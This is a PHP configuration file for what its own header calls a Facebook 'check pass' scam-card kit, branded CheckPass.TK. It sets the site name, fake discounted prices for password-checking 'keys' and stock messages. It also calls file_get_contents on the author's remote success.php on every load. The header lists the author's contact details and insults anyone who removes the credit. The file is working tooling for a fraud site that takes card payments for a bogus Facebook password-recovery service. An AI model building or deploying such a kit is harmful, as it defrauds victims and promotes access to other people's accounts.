<?php
/* <!--
- Source : Code_Checkpass_Facebook_Scam_Card (v2.7)
- (If there is a new update, please go to Duong Viet Thang's youtube channel)
- Author : Dương Việt Thắng
- Theme : Võ Hữu Nhân
- Contact :
+ Mail : bisexy.ga@gmail.com
+ Zalo : 0378888658
+ Youtube : Dương Việt Thắng
================ XÓA COPYRIGHT LÀ SÚC VẬT :D ================
--> */
$bs_main_url = "http://checkpass.tk";
$bs_main_domain = "CheckPass.TK";
$bs_domain_nav = "<i class='fa fa-cube' aria-hidden='true'></i> CheckPass<b>.TK</b>";
$bs_title = $bs_main_domain." - Check Pass Facebook Online";
$bs_time = time();
#=============== GIÁ =======================================
$key1 = "<strike>50.000</strike> GIẢM GIÁ CÒN 0 VND";
$key2 = "<strike>100.000</strike> GIẢM GIÁ CÒN 50.000 VND";
$key3 = "<strike>200.000</strike> GIẢM GIÁ CÒN 100.000 VND";
$key4 = "<strike>300.000</strike> GIẢM GIÁ CÒN 200.000 VND";
$key5 = "<strike>500.000</strike> GIẢM GIÁ CÒN 300.000 VND";
$key6 = "<strike>1.000.000</strike> GIẢM GIÁ CÒN 500.000 VND";
#=============== INFO KEY ==================================
$infokey1 = "<font color='red'>Hết key</font>";
$infokey2 = "Còn key";
#=============== CONNECT ===================================
$bs_success = "http://checkpass.tk/@BS_Result/success.php";
$bs_curl_success = file_get_contents($bs_success);
?>